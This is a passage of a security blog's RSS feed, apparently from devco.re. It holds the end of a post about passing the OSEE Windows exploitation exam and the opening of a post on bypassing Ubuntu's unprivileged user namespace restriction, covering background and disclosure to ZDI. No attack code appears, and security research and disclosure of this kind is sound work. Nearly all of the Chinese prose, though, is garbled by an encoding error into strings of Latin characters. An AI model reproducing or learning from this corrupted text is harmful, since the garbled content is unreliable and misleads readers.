&lt;p&gt;ç”±æ–¼é•·æœŸåç§‘åœ¨é‚£äº›ã€Œé ç«¯åˆ©ç”¨ã€çš„æ¼æ´ï¼Œè€å¯¦èªªé€™å€‹ç« ç¯€å°æˆ‘ä¾†èªªçœŸçš„å®Œå…¨ç©ºç™½ã€‚è‡ªå·±å°æ–¼ Windows Kernel çš„èªè­˜ä¹Ÿé‚„åœç•™åœ¨æ—©æœŸçš„ &lt;a href=&quot;https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf&quot;&gt;Token Kidnapping&lt;/a&gt;ï¼›æˆ–è€…&lt;a href=&quot;https://devco.re/en/blog/author/angelboy/&quot;&gt;å¼·è€…æˆ‘åŒäº‹&lt;/a&gt;æ¯æ¬¡åˆ†äº«æ™‚ï¼Œå·å­¸å€‹ä¸€å…©æ‹›ã€‚ä¸éä»”ç´°æƒ³æƒ³ï¼Œä»–æ¯å€‹ç¦®æ‹œéƒ½åœ¨å ±æ–°æ´ï¼ˆç¾¨æ…•ï¼‰ï¼Œç®—ä¸‹ä¾†å¥½åƒä¹Ÿå­¸äº†ä¸å°‘æ‹› ğŸ˜†ã€‚åªæ˜¯ï¼Œç›´åˆ°å»å¹´ OSEE èª²ç¨‹å‰ï¼Œæˆ‘é€£ä¸€æ¬¡ Kernel Exploit éƒ½é‚„æ²’å®Œæˆéï¼Œå› æ­¤å°±ç®—å‰é¢æ‡‰ç”¨å±¤é‚„èƒ½é è€æœ¬ç¡¬å—‘ï¼Œå¾é€™é–‹å§‹å°±çœŸçš„å®Œå…¨é™Œç”Ÿäº†ï¼Œä¹Ÿæ˜¯æœ¬æ¬¡è€ƒè©¦æˆ‘æœ€æœ€æœ€æœ€æœ€æ“”å¿ƒçš„éƒ¨åˆ† ğŸ˜¨ã€‚&lt;/p&gt;

&lt;p&gt;æˆ‘å¤§æ¦‚èŠ±äº†ä¸€æ•´å¤©è®“è‡ªå·±æ²‰æµ¸åœ¨ Windows Kernel çš„ä¸–ç•Œï¼Œé‡æ–°ç†Ÿæ‚‰ IRQL/IOCTLã€PML4/PTEã€SMEP/SMAP çš„æ¦‚å¿µï¼Œä»¥åŠæ±é€›é€›è¥¿é€›é€› KPROCESS/KTHREAD ç­‰é‡è¦çš„çµæ§‹ã€‚&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h2 id=&quot;5-kernel-exploit---part-2&quot;&gt;5. Kernel Exploit - Part 2&lt;/h2&gt;

&lt;p&gt;ä¾†ä¸åŠå•¦ã€‚æ€éº¼å¯èƒ½åœ¨ä¸‰å¤©è¤‡ç¿’å®Œ OSEEï¼Œé€™ç« æ•´å€‹è·³éXD&lt;/p&gt;

&lt;p&gt;â€”â€” ä¸éé›–ç„¶ä¾†ä¸åŠï¼Œä½† Win32k å¸¸è¦‹çš„æ¼æ´æ¨¡å¼æˆ‘å¤§æ¦‚é‚„æ˜¯çŸ¥é“ï¼Œåªèƒ½ç¥ˆç¦±è‡ªå·±çš„è€æœ¬é‚„å¤ ç”¨ï¼ˆï¼Ÿï¼‰&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;æ­¤å¤–ï¼Œé€™ç« æ‰€æåˆ°çš„è™›æ“¬åŒ–å®‰å…¨ï¼Œä¾‹å¦‚ VBSã€HVCIã€EPTã€kCFG ç­‰ã€‚é›–ç„¶æˆ‘çŒœä¸æœƒè€ƒï¼ˆæƒ³æƒ³å°±å¾ˆé›£å‡ºXDï¼‰ï¼Œä½†æˆ‘åå€’çœ‹å¾—å¾ˆé–‹å¿ƒã€‚å¥½å¥½è®€ä¸€è®€æ„Ÿè¦ºå°æœªä¾†ä¹Ÿå¾ˆæœ‰å¹«åŠ©ï¼Œè€Œæœ€å¾Œä¸€å¤©å°±åœ¨é€™ç¨® â€”â€” è¼•è¼•é¬†é¬†ã€éš¨éš¨ä¾¿ä¾¿ã€æ±çœ‹çœ‹è¥¿çœ‹çœ‹çš„å¿«æ¨‚æ°£æ°›ä¸‹æ¸¡éï¼âœ¨ ğŸ˜Œ ğŸŒ±&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;è€ƒè©¦&quot;&gt;è€ƒè©¦&lt;/h1&gt;

&lt;p&gt;ç”±æ–¼æŒ‘äº†ä¸€å€‹çˆ›æ™‚é–“ï¼Œå‰ä¸€å¤©æˆ‘ç‰¹åœ°åäºŒé»ä¸åˆ°å°±ä¸ŠåºŠç¡è¦ºï¼Œçµæœå°±æ˜¯ â€”â€” å®Œ ï½ å…¨ ï½ ç¡ ï½ ä¸ ï½ è‘— ğŸ˜µâ€ğŸ’« ğŸ›Œ âŒã€‚ç´„è«æ—©ä¸Šå››é»æè‘—å…©ç½ç´…ç‰›åˆ°è¾¦å…¬å®¤æ‡‰è©¦ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250702/upload_8de62a77c3ea1cfb7137088cb8372a58.jpeg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;æ™‚é–“ä¸€åˆ°ä¾¿æ˜¯ OffSec ä¸€ç³»åˆ—çš„ â€”â€” é–‹æ”å½±æ©Ÿã€How are youã€I am fine thank youï¼Œé‚„æœ‰ç§€è­·ç…§çš„æµç¨‹ã€‚è€ƒè©¦é–‹å§‹æ™‚å®Œå…¨ä¸æƒ³é¢å°æœªçŸ¥äº‹ç‰©ï¼Œåå€’å…ˆæŒ‘äº†æ›´é›£çš„ UserMode App é–‹å±€ï¼Œéç¨‹ä¸­ä¸çŸ¥è…¦è¢‹å¡åˆ°å•¥é‚„æŒ‘äº†ä¸€å€‹çˆ›æ–¹æ³•ï¼Œå¦„æƒ³è‘—ä¸€æ­¥ç™»å¤©ã€‚å¯«å®Œè¦æˆ³é ç«¯æ™‚æ‰ç™¼ç¾é€£æœ€é–‹å§‹çš„ Leak éƒ½å¤±æ•—å¤§å´©æ½°ï¼Œå¥½åœ¨æœ€å¾Œé‚„æ˜¯é è‘—æ¯…åŠ›ç¡¬è¼¾éå»ã€‚è§£å®Œç¬¬ä¸€é¡Œç™¼ç¾å¤©äº®äº†ï¼Œç‚ºäº†ä¸æ‰“æ“¾åŒäº‹æ˜ŸæœŸä¸€ä¸Šç­è¶•ç·Šè½‰æ›åœ°é»ã€‚å¿« 48 å°æ™‚æ²’ç¡ä¸‹æ¨“æ¢¯æ™‚é‚„å°æšˆäº†ä¸€ä¸‹ï¼Œåˆé‡æ–°èªè­˜åˆ°ç¡è¦ºå¾ˆé‡è¦XD&lt;/p&gt;

&lt;p&gt;å›åˆ°å®¶æ´—æ´—ç¡èµ·ä¾†è¶•å¿«çœ‹ä¸‹ä¸€é¡Œã€‚ç›¸è¼ƒå‰ä¸€é¡Œï¼ŒKernel ææ¬Šçš„æ´çœŸçš„ç°¡å–®åˆ°ä¸å¯æ€è­°ã€‚ä½†å°ä¸‘å¦‚æˆ‘ï¼Œé€£ä¸€é–‹å§‹çš„ç¢ºèªç’°å¢ƒéƒ½èŠ±äº†å¥½å¤šæ™‚é–“ã€‚æœ¬åœ°ææ¬Šéƒ¨åˆ†å¥½åƒå°±è¼ƒæ²’å•¥å¥½èªªçš„ï¼Œæ¯”è¼ƒå€¼å¾—ä¸€æçš„æ˜¯&lt;del&gt;é‘‘æ–¼æœ‰åŒäº‹&lt;a href=&quot;#&quot;&gt;å› ç‚ºå ±å‘Šå¯«å¤ªæ°´&lt;/a&gt;æ²’é&lt;/del&gt;ï¼Œæˆ‘èŠ±äº†å…«å€‹å°æ™‚å¯«å ±å‘Šï¼ˆæ“šèªªé‚„ç®—å¿«çš„ï¼‰ï¼Œæœ€çµ‚åœ¨è€ƒè©¦çµæŸå‰ä¸€å°æ™‚ææ—©äº¤å·çµæŸæ•´å€‹è€ƒè©¦æµç¨‹ï¼ğŸ‰&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;å¾ŒçºŒ&quot;&gt;å¾ŒçºŒ&lt;/h1&gt;

&lt;p&gt;éƒ½è€ƒéäº†ï¼Œæ‡‰è©²å¯ä»¥çµæŸé€™ç¯‡äº†å§ â€”â€” é™„ä¸Šäººæ¬Šï¼&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250702/upload_c19a76bdfc7a47e02b2bd978aa89683f.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;èªªå¯¦è©±ï¼ŒOSEE é›£åº¦æ•´é«”é›£åº¦ä¸é«˜ã€‚ä¸éè‡ªå·±é‚„åœ¨å¡åœ¨å¾ˆå¤šä¸æ‡‰è©²çš„åœ°æ–¹ï¼Œè‘—å¯¦è©²æ‰“å±è‚¡ã€‚é™¤äº†æ²’ç¡é£½ã€æ²’&lt;del&gt;æ´—æ¾¡èƒ½å¥½å¥½&lt;/del&gt;æ€è€ƒï¼Œé‚„æœ‰ä¸æ˜¯æ¯èªé€™äº›é¡¯è€Œæ˜“è¦‹çš„è—‰å£å¤–ï¼Œäº‹å¾Œé‚„æ˜¯è¦†ç›¤äº†ä¸‹è‡ªå·±é‚„æœ‰å“ªäº›ã€Œå¯ä»¥åšå¾—æ›´å¥½ã€çš„åœ°æ–¹ï¼Ÿ&lt;/p&gt;

&lt;p&gt;å…¶å¯¦æ•´å€‹æµç¨‹çœ‹ä¸‹ä¾†æˆ‘ä¹ŸçŸ¥é“ï¼Œæœ€æ¬ ç¼ºçš„å°±æ˜¯ã€Œå¯¦ä½œã€â€”â€” é€™å°è‡´é›–ç„¶èƒ½æå®šæ‰€æœ‰çš„é—œéµæµç¨‹ï¼Œåè€Œæˆ‘éƒ½å¡åœ¨ä¸€äº›è«åå…¶å¦™çš„å°ç´°ç¯€ä¸Šã€‚å°¤å…¶ CTF çš„èƒŒæ™¯åˆå®¹æ˜“åœ¨ä¸€äº›ä¸åˆ‡å¯¦éš›çš„åœ°æ–¹ä¸Šé‘½ç‰›è§’å°–ï¼Œå› æ­¤é€™è£¡çµ¦è€ƒç”Ÿçš„ä¸€é»å°å»ºè­°æ˜¯ï¼š&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;çµ•å°è¦æŠŠèª²å ‚ä¸Šçš„ Extra Miles åšéä¸€éï¼Œæœ‰å¥½å¥½åšå®Œä¸€å®šæœƒéï¼&lt;/li&gt;
  &lt;li&gt;OSEE è‘—é‡åœ¨æœ€åŸºç¤çš„ã€Œä½ æ‡‚ä¸æ‡‚ã€ï¼Œå› æ­¤ä¸ç”¨æ“”å¿ƒæ²’æœ‰å¯¦éš›çš„æ¼æ´æŒ–æ˜ç¶“é©—æœƒç„¡æ³•æ‡‰è©¦ã€‚&lt;/li&gt;
  &lt;li&gt;CTF ä¸Šé‚£äº›ç‚«æ‹›ä¸æœƒå‡ºç¾ï¼Œç•¶ä½ é–‹å§‹æ€è€ƒç”¨ Partial Overwrite æäº‹æ™‚ä½ å·²ç¶“èµ°ç«å…¥é­”äº†ã€‚&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;çµ¦è‡ªå·±çš„ä¸€å€‹å°åæ€æ˜¯ â€”â€” é€™äº›å¹´å¥½åƒå¤ªæŠŠæŠ€èƒ½ç‰¹åŒ–åœ¨ã€Œæ‰¾æ¼æ´ã€é€™ä»¶äº‹ä¸Šï¼Œå°æ–¼ã€Œè¨˜æ†¶é«”ä¸Šçš„åˆ©ç”¨ã€åå€’æ²’æœ‰å¤ªå¤šè‘—å¢¨ï¼Œèªªèµ·ä¾†è‘—å¯¦æœ‰äº›æ…šæ„§ï¼›ä¸éæƒ³æƒ³è‡ªå·±åªæ˜¯éš» Web ç‹—ï¼Œåˆè¦ºå¾—å¥½åƒé‚„å¥½ï¼ˆæ±ªï¼‰ã€‚ç›¸ä¿¡å¦‚æœæœ‰ WEB-401 çš„è©±æˆ‘ä¹Ÿèƒ½é€Ÿé€šï¼ ğŸ’ª&lt;/p&gt;

&lt;p&gt;â€”â€” åç­‰ OffSec å‡º WEB-401 ğŸ˜œ&lt;/p&gt;

&lt;p&gt;&lt;br /&gt;&lt;/p&gt;

&lt;h1 id=&quot;æ¨è–¦å—&quot;&gt;æ¨è–¦å—ï¼Ÿ&lt;/h1&gt;

&lt;p&gt;å¹³å¿ƒè€Œè«–ï¼Œé€™æ˜¯ä¸€æ¬¡å¾ˆæ£’çš„é«”é©—ï¼ä¸åƒ…èª²ç¨‹å…§å®¹å……å¯¦ã€è·³è„«äº†èˆ’é©åœˆï¼Œç”šè‡³é‚„èƒ½è·Ÿå¥½æœ‹å‹ä¸€èµ·è®€æ›¸ï¼ç„¶è€Œæœ€ä»¤æˆ‘é©šè¨çš„æ˜¯ã€Œèª²ç¨‹è¬›å¸«çš„å°ˆæ¥­åº¦ã€ï¼ˆè½èªª OSEE å…¨çƒåªæœ‰å››ä½è¬›å¸«ï¼‰ï¼Œä»–å€‘ä¸åƒ…å°èª²ç¨‹çš„æŒæ¡åº¦æ¥µé«˜ã€å°æ¯å€‹ç´°ç¯€æ»¾ç“œçˆ›ç†Ÿï¼Œç”šè‡³èƒ½è§£ç­”ä½ å°æ–¼ Windows æ‰€æœ‰å¤©é¦¬è¡Œç©ºçš„æ€ªå•é¡Œã€‚æˆ‘ç›¸ä¿¡æ—¢ä½¿æ˜¯å·²ç¶“èƒ½é€Ÿé€šçš„ Angelboyï¼Œä¹Ÿå¾èª²å ‚ä¸Šå­¸åˆ°ä¸å°‘æ–°æ±è¥¿ï¼ˆå§ï¼‰ï¼ˆè·‘XD&lt;/p&gt;

&lt;p&gt;ä¸éï¼Œç„¡è«–æ˜¯æƒ³ç³»çµ±æ€§åœ°äº†è§£ Windows çš„æ¼æ´åˆ©ç”¨é«”ç³»ï¼Œæˆ–æ˜¯ CTF ä»”æƒ³è¦é©—è­‰ä¸€ä¸‹è‡ªå·±çš„èƒ½åŠ›åˆ°å“ªï¼Œæˆ‘æƒ³ EXP-401 ï¼ˆOSEEï¼‰çµ•å°æ˜¯ä½ çš„æœ€ä½³é¸æ“‡ï¼ ğŸ‘&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2025/07/02/webdog-view-on-osee-advanced-windows-exploitation-from-0.1/</link>
                <guid>https://devco.re/blog/2025/07/02/webdog-view-on-osee-advanced-windows-exploitation-from-0.1</guid>
                <pubDate>Wed, 02 Jul 2025 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>The Journey of Bypassing Ubuntuâ€™s Unprivileged Namespace Restriction</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction/&quot;&gt;ä¸­æ–‡ç‰ˆæœ¬&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;è¿‘æœŸ Ubuntu å¯¦ä½œäº†æ–°çš„æ²™ç›’æ©Ÿåˆ¶ä¾†æ¸›å°‘æ”»æ“Šé¢ï¼Œç„¶è€Œå…¶ä¹çœ‹ä¹‹ä¸‹å …ä¸å¯æ‘§ï¼Œä½†ç¶“éç ”ç©¶å¾Œç™¼ç¾ï¼Œç¹éæ–¹å¼ä¸¦æ²’æœ‰æƒ³åƒä¸­é‚£éº¼å›°é›£ï¼æœ¬æ–‡å°‡ä»‹ç´¹æˆ‘å€‘å¦‚ä½•å¾æ ¸å¿ƒå±¤ç´šè‘—æ‰‹æ‰¾å‡ºç¹éæ–¹æ³•ï¼Œä¸¦åˆ†äº«ç ”ç©¶éç¨‹ä¸­é‡åˆ°çš„ä¸€äº›æœ‰è¶£æ•…äº‹ã€‚&lt;/p&gt;

&lt;h2 id=&quot;1-introduction&quot;&gt;1. Introduction&lt;/h2&gt;

&lt;h3 id=&quot;11-ubuntus-new-sandbox-model&quot;&gt;1.1. Ubuntuâ€™s New Sandbox Model&lt;/h3&gt;

&lt;p&gt;é•·ä¹…ä»¥ä¾†ï¼ŒLinux æä¾›äº† &lt;strong&gt;éç‰¹æ¬Šä½¿ç”¨è€…å‘½åç©ºé–“ï¼ˆUnprivileged User Namespaceï¼‰&lt;/strong&gt; çš„æ©Ÿåˆ¶ï¼Œè®“ä½¿ç”¨è€…èƒ½åœ¨éš”é›¢ç’°å¢ƒä¸­åŸ·è¡Œç¨‹å¼ï¼Œä¸¦ä¸”åœ¨å…è¨±ç¨‹å¼åœ¨å‘½åç©ºé–“å…§å¯ä»¥åŸ·è¡Œé«˜æ¬Šé™çš„è¡Œç‚ºã€‚é›–ç„¶è©²æ©Ÿåˆ¶æä¾›ä½¿ç”¨è€…æ›´å¤šçš„å½ˆæ€§ï¼Œä½†å› ç‚ºèƒ½èˆ‡æ›´å¤šå­ç³»çµ±æˆ–é©…å‹•ç¨‹å¼äº’å‹•ï¼Œä¹Ÿé–“æ¥æš´éœ²å‡ºæ›´å¤šæ ¸å¿ƒæ”»æ“Šé¢ã€‚ç‚ºäº†è§£æ±ºæ­¤å•é¡Œï¼ŒUbuntu åœ¨ 2024 å¹´å››æœˆåº•ï¼Œä¹Ÿå°±æ˜¯ Pwn2Own çµæŸå¾Œä¸ä¹…ï¼Œç™¼å¸ƒäº†ä¸€ç¯‡&lt;a href=&quot;https://ubuntu.com/blog/whats-new-in-security-for-ubuntu-24-04-lts&quot;&gt;å®‰å…¨ç›¸é—œçš„æ–‡ç« &lt;/a&gt;ï¼Œå…§å®¹æåˆ°ä»–å€‘å¯¦ä½œäº†ä¸€å¥—åŸºæ–¼ AppArmor çš„æ²™ç›’æ©Ÿåˆ¶ï¼Œèƒ½æœ‰æ•ˆåœ°é™åˆ¶ä¸å—ä¿¡ä»»çš„ç¨‹å¼ä½¿ç”¨éç‰¹æ¬Šä½¿ç”¨è€…å‘½åç©ºé–“å’Œå­ç³»çµ± io_uringï¼Œè—‰æ­¤é™ä½æ½›åœ¨çš„æ”»æ“Šé¢ã€‚&lt;/p&gt;

&lt;p&gt;éš¨å¾Œï¼Œåœ¨ 2024 å¹´ä¹æœˆï¼ŒUbuntu åˆå…¬é–‹äº†ä¸€ä»½&lt;a href=&quot;https://static.sched.com/hosted_files/lsseu2024/ed/Restricting%20Unprivileged%20User%20Namespaces%20In%20Ubuntu.pdf&quot;&gt;æŠ•å½±ç‰‡&lt;/a&gt;ï¼Œé€²ä¸€æ­¥æ·±å…¥ä»‹ç´¹é€™å¥—æ²™ç›’çš„æ¶æ§‹ã€‚å…§å®¹ä¸»è¦èªªæ˜äº†ä»–å€‘ç›®å‰é¢è‡¨çš„å•é¡Œï¼šæ”»æ“Šè€…æŒçºŒä»¥éç‰¹æ¬Šä½¿ç”¨è€…å‘½åç©ºé–“ç‚ºåª’ä»‹ï¼Œåˆ©ç”¨æ ¸å¿ƒæ¨¡çµ„çš„æ¼æ´é€²è¡Œææ¬Šã€‚æ­¤å¤–ï¼Œä»–å€‘ä¹Ÿè©³ç´°è§£é‡‹äº†æ•´å€‹ä¿è­·æ©Ÿåˆ¶çš„å¯¦ä½œï¼Œä¸¦è©•ä¼°äº†å°å…¥æ²™ç›’å¾Œçš„é æœŸæˆæ•ˆã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250626/upload_42ba484ec23b76cbbb9a0d60184bf5d1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç”±æ–¼åªæœ‰ç‰¹å®šç¨‹å¼èƒ½å»ºç«‹éç‰¹æ¬Šä½¿ç”¨è€…å‘½åç©ºé–“ï¼Œé€™è®“æ”»æ“Šè€…èƒ½æ¥è§¸åˆ°çš„æ ¸å¿ƒå­ç³»çµ±å¤§å¹…æ¸›å°‘ï¼Œåƒæ˜¯éå»ç¶“å¸¸å‡ºç¾ææ¬Šæ¼æ´çš„ netfilter å’Œ net/schedï¼Œå†ä¹Ÿæ²’æœ‰è¾¦æ³•è¢«å­˜å–ã€‚é€™å€‹ä¿è­·æ©Ÿåˆ¶çœ‹ä¼¼æ»´æ°´ä¸æ¼ï¼Œç”šè‡³è®“éƒ¨åˆ† Linux æ ¸å¿ƒç ”ç©¶å“¡é–‹å§‹èªç‚ºï¼Œä½œç‚ºæ­·å¹´ä¾† Pwn2Own å”¯ä¸€çš„ Linux ææ¬Šç›®æ¨™ï¼ŒUbuntu å¯èƒ½å·²ç¶“è®Šå¾—é›£ä»¥è¢«çªç ´ã€‚&lt;/p&gt;

&lt;h3 id=&quot;12-emergence-of-the-bypass-method&quot;&gt;1.2. Emergence of the Bypass Method&lt;/h3&gt;

&lt;p&gt;ç„¶è€Œï¼Œå°±åœ¨ä»Šå¹´ 2 æœˆ 16 æ—¥ï¼Œæ­£ç•¶æˆ‘åœ¨æ»‘ Twitter ä¸Šçš„æ–‡ç« æ™‚ï¼Œçªç„¶çœ‹åˆ°æœ‰äººèªªï¼šé€™å€‹ç”¨ AppArmor å¯¦ä½œçš„ä¿è­·æ©Ÿåˆ¶ç«Ÿç„¶å¯ä»¥ç°¡å–®åœ°è¢«ç¹éï¼æ€éº¼å¯èƒ½æœ‰é€™ç¨®äº‹ï¼Ÿé€™å‰‡ç•™è¨€æˆåŠŸå¼•èµ·æˆ‘çš„æ³¨æ„äº†ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250626/upload_aa9dd31f3f5a20bfe166d06729f5544e.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;å¦‚æœé‚£ä½ç ”ç©¶å“¡æ‰€è¨€å±¬å¯¦ï¼Œé‚£å°±ä»£è¡¨ç›®å‰è‡³å°‘æœ‰ä¸€å€‹ç¹éæ–¹å¼èƒ½ç¹éæ²™ç›’ã€‚å­˜åœ¨å·²çŸ¥è§£ï¼Œé™æ™‚å…§æ‰¾å‡ºè§£æ³•ï¼Œé€™ä¸å°±æ˜¯ä¸€é“ CTF Misc é¡Œå—ï¼Ÿå‰›å¥½ç®—äº†ç®—æ™‚é–“ï¼ŒPwn2Own 2025 å·®ä¸å¤šä¹Ÿå¿«é–‹å§‹äº†ï¼Œæ–¼æ˜¯æˆ‘æ±ºå®šè‘—æ‰‹åˆ†æ Ubuntu æ˜¯æ€éº¼é€é AppArmor å¯¦ä½œé€™å¥—é™åˆ¶æ©Ÿåˆ¶ï¼Œä¸¦å˜—è©¦æ‰¾å‡ºè©²ç ”ç©¶å“¡æåˆ°çš„ç¹éæ–¹å¼ï¼ŒæŠŠå®ƒç•¶ä½œä¸€é“ 500 åˆ†çš„ CTF é¡Œä¾†è§£ã€‚&lt;/p&gt;

&lt;p&gt;æ²’æƒ³åˆ°æˆ‘æƒ³å¾—å¤ªé›£äº†ï¼Œç¹éæ‰‹æ³•éæ–¼ç°¡å–®ï¼Œæ‰€ä»¥é€™é¡Œå¤§æ¦‚â€¦åªå€¼ 100 åˆ†å§ï¼é›–ç„¶æˆ‘å° AppArmor çš„æ©Ÿåˆ¶ä¸å¤ªç†Ÿï¼Œä½†å› ç‚ºåˆ†ææ–¹å‘å¾ˆæ˜ç¢ºï¼Œå¾é–‹å§‹ç ”ç©¶åˆ°æ‰¾å‡ºç¹éæ–¹å¼ï¼Œæ•´å€‹éç¨‹ä¸åˆ°ä¸‰å€‹å°æ™‚ã€‚å¾Œä¾†æˆ‘ç”šè‡³èªç‚ºï¼Œåªè¦æœ‰çœ‹åˆ°é‚£å‰‡æ¨æ–‡ä¸¦å¯¦éš›åˆ†æï¼Œæ‡‰è©²éƒ½èƒ½æ‰¾åˆ°é€™å€‹æ–¹æ³•ã€‚æ—¢ç„¶èƒ½å»ºç«‹éç‰¹æ¬Šä½¿ç”¨è€…å‘½åç©ºé–“ï¼Œé‚£æ¥ä¸‹ä¾†çš„ç›®æ¨™å°±å–®ç´”ä¸å°‘ï¼šå¾é‚£äº› Ubuntu é è¨­é–‹å•Ÿã€ä½† kernelCTF æ²’æœ‰å•Ÿç”¨çš„ç¶²è·¯æ ¸å¿ƒæ¨¡çµ„ä¸Šï¼Œæ‰¾ä¸€å€‹å¯ä»¥åˆ©ç”¨çš„æ¼æ´ã€‚çœ‹ä¾†ä»Šå¹´æœ‰æœ›å†åƒåŠ ä¸€æ¬¡ Pwn2Own å›‰ï¼&lt;/p&gt;

&lt;p&gt;åˆéäº†å¹¾å¤©ï¼ŒPwn2Own ç¸½ç®—å…¬å¸ƒäº†é€™æ¬¡æ¯”è³½çš„è¦å‰‡ã€‚æ²’æƒ³åˆ°é€™æ¬¡çš„ Linux ææ¬Šç›®æ¨™ç«Ÿç„¶ä¸æ˜¯ Ubuntuï¼Œè€Œæ˜¯æ›æˆäº† Red Hat Enterprise Linuxï¼ˆRHELï¼‰ã€‚åˆå› ç‚º RHEL æ²’æœ‰é‡å°éç‰¹æ¬Šä½¿ç”¨è€…å‘½åç©ºé–“åšä»»ä½•é™åˆ¶ï¼Œå› æ­¤ä¹Ÿä¸éœ€è¦ä»€éº¼ç¹éæ–¹å¼ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œæˆ‘å‰›æ‰¾åˆ°æ²’å¤šä¹…çš„ç¹éæ–¹æ³•ï¼Œè®Šå¾—ä¸€é»ç”¨è™•éƒ½æ²’æœ‰ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20250626/upload_58836702284ef31386e2d2f737ef8883.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;13-vendor-response&quot;&gt;1.3. Vendor Response&lt;/h3&gt;

&lt;p&gt;ç•¶çŸ¥é“ Ubuntu ä¸å†æ˜¯ä»Šå¹´ Pwn2Own çš„æ¯”è³½ç›®æ¨™å¾Œï¼Œæˆ‘é¦¬ä¸Šé€é ZDI å›å ±äº†é€™å€‹ç¹éæ–¹æ³•ï¼Œä¸¦é æœŸç”± ZDI è·Ÿ Ubuntu çš„å®‰å…¨åœ˜éšŠå”ä½œé€²è¡Œä¿®å¾©ã€‚ä¸éå°±åœ¨ç­‰å¾… ZDI å›è¦†çš„é€™æ®µæœŸé–“ï¼Œä¸€é–‹å§‹æåˆ°é€™é …ä¿è­·æ©Ÿåˆ¶èƒ½è¢«ç¹éçš„ç ”ç©¶å“¡ @rodduxï¼Œåœ¨ 3 æœˆ 21 æ—¥å…¬é–‹äº†ä»–ç•¶åˆæ‰€èªªçš„&lt;a href=&quot;https://x.com/roddux/status/1903028631514837107&quot;&gt;ç¹éæŠ€å·§&lt;/a&gt;ï¼Œé›–ç„¶è·Ÿæˆ‘æ‰¾åˆ°çš„æ–¹æ³•åœ¨æ¦‚å¿µä¸Šæœ‰äº›é¡ä¼¼ï¼Œä½†å¯¦éš›ä¸Šæ˜¯ä¸åŒçš„æˆå› ï¼å¹¾å¤©å¾Œï¼ŒQualys Team ä¹Ÿæ³¨æ„åˆ° @roddux çš„è²¼æ–‡ï¼Œä¸¦åœ¨ 3 æœˆ 27 æ—¥å…¬é–‹äº†ä»–å€‘æ—©åœ¨å¹´åˆå°±ç™¼ç¾çš„&lt;a href=&quot;https://www.qualys.com/2025/three-bypasses-of-Ubuntu-unprivileged-user-namespace-restrictions.txt&quot;&gt;ä¸‰å€‹ç¹éæ‰‹æ³•&lt;/a&gt;ï¼Œé‚„é™„ä¸Šäº†è©³ç´°çš„æŠ€è¡“æˆå› èªªæ˜ã€‚åŸä¾†é€™äº›æ–¹æ³•æ—©åœ¨å¹´åˆå°±å›å ±çµ¦ Ubuntu å®‰å…¨åœ˜éšŠï¼Œåªæ˜¯ä¸€ç›´æ²’å°å¤–å…¬é–‹ï¼ˆå¯èƒ½æ˜¯å› ç‚ºé‚„åœ¨æƒ³è¦æ€éº¼ä¿®ï¼‰ã€‚ç›´åˆ°é¡ä¼¼æ‰‹æ³•åœ¨ç¶²è·¯ä¸Šè¢«å…¬é–‹ï¼Œä»–å€‘æ‰é‡‹å‡ºç•¶æ™‚æäº¤çµ¦ Ubuntu å®‰å…¨åœ˜éšŠçš„å ±å‘Šã€‚&lt;/p&gt;

&lt;p&gt;èº«ç‚ºä¸€å€‹ç ”ç©¶å“¡ï¼Œçœ‹è‘—ä¸€å€‹å€‹ç¹éæŠ€å·§å’Œåˆ†æç´°ç¯€è¢«å…¬é–‹ï¼Œæˆ‘å»å› ç‚ºå·²ç¶“å›å ±çµ¦ ZDI è€Œç„¡æ³•å°å¤–åˆ†äº«è‡ªå·±çš„ç ”ç©¶ã€‚éš”æ²’å¹¾å¤©ï¼Œæˆ‘ç”šè‡³é‚„æ²‰ä¸ä½æ°£å¯„ä¿¡çµ¦ ZDIï¼Œè©¢å•ä»–å€‘æ˜¯å¦èƒ½å–æ¶ˆæˆ‘çš„å›å ±ã€‚é‚„å¥½ orange è€å¿ƒåœ°å‘æˆ‘åˆ†æå–æ¶ˆå›å ±å¾Œçš„å„ªåŠ£ï¼Œæˆ‘æ‰æ‰¾å›å†·éœï¼Œå†å¯„äº†ä¸€å°ä¿¡è«‹ä»–å€‘å–æ¶ˆæˆ‘å…ˆå‰å–æ¶ˆå›å ±çš„è¦æ±‚ã€‚&lt;/p&gt;

